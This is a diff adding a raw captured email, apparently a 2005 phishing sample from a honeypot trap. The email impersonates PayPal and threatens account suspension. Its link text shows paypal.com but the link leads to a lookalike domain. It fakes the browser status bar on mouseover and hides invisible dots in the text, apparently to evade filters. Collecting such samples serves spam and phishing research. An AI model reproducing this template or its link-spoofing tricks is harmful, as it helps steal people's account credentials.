@@ -1,0 +1,73 @@
+Received: from 72-29-76-63.dimenoc.com (HELO dime94.dizinc.com) (72.29.76.63)
+  by projecthoneypotmailserver with SMTP; 22 Jun 2005 15:35:40 -0000
+Received: from localhost ([127.0.0.1]:50048 helo=www.heroscape.net)
+	by dime94.dizinc.com with esmtp (Exim 4.50)
+	id 1Dl7GM-0004M2-Kq
+	for projecthoneypot@projecthoneypot.org; Wed, 22 Jun 2005 11:35:38 -0400
+Date: Wed, 22 Jun 2005 11:35:38 -0400
+To: "projecthoneypot@projecthoneypot.org\r" <projecthoneypot@projecthoneypot.org>
+From: "service@paypal.com" <service@paypal.com>
+Subject: Your Account Hass Ben Limited
+Message-ID: <055b39766690c783eeb423b3d1ecfdf7@www.heroscape.net>
+X-Priority: 3
+X-Mailer: PHPMailer [version 1.72]
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
+Content-Type: text/html; charset="iso-8859-1"
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - dime94.dizinc.com
+X-AntiAbuse: Original Domain - tiggersdontlike.mcmike.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - paypal.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+
+<style type="text/css">
+<!--
+.Style1 {font-family: Arial, Helvetica, sans-serif}
+.Style2 {font-size: 13px}
+-->
+</style>
+</head>
+
+<body>
+<A href="http://www.paypal.com/cgi-bin/webscr?cmd=_home">
+<IMG src="http://images.paypal.com/en_US/i/logo/email_logo.gif" border=0 width="255" height="35"></A>
+<br><p class="Style1 Style1"><font face="Verdana" size="2">Dear valued <strong>PayPal</strong> member:
+</font> </p>
+<p class="Style1"><font face="Verdana" size="2">It has come to out attention that your <strong>PayPal</strong> account informations needs to <br>
+  be updated as <font color="#FFFFFC">.</font> part of <font color="#FFFFFC">.</font>our continuing<font color="#FFFFFC">.</font> commitment to protect <font color="#FFFFFC">.</font>your account<br>
+  and to reduce the instance of <font color="#FFFFFC">.</font>fraud on our website. If you <font color="#FFFFFC">.</font>could please take<br>
+  5-10 minutes out of your online experience and update your personal records<br>
+you will not run into any futur problems with the online services.</font></p>
+<p class="Style1"><font face="Verdana" size="2">However, failure to update your records will result in account suspension.   <br>
+Please update your records on or before <strong><font color="#FF0000">June 24, 
+2005</font></strong>.
+</font> </p>
+<p class="Style1"><font face="Verdana" size="2">Once you have updated<font color="#FFFFFC">.</font> your account records, your <strong>PayPal</strong> session will not<br>
+  be interrupted and will continue as normal. </font> </p>
+<p class="Style1"><font face="Verdana" size="2">To update your <strong>PayPal</strong> records click on the following link:
+</font> 
+</p>
+<p class="Style1">
+<a target="_blank" class="Style5 Style2" onMouseover="window.status='https://www.paypal.com/cgi-bin/webscr?cmd=_login-run'; return true" onMouseout="window.status=''" href="http://paypal.com.tyhcomputadores.com/paypal.htm">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run
+</a>
+</p>
+<p class="Style1"><font face="Verdana" size="2">Thank you for using Paypal ! <br>
+  <strong>The PayPal Update Team</strong>. </font> </p>
+<p class="Style1"><font face="Verdana" size="2">Accounts Management As outlined in our User Agreement, PayPal will <br>
+  periodically send you information about site changes and enhancements.</font><br>
+</p>
+<p class="Style1"></p></p>
+<span class="Style3"><span class="Style4"><font color="#CCCCCC">PayPal Email ID PP243</font></span>
+</p>
+</span>
+</body
+
+
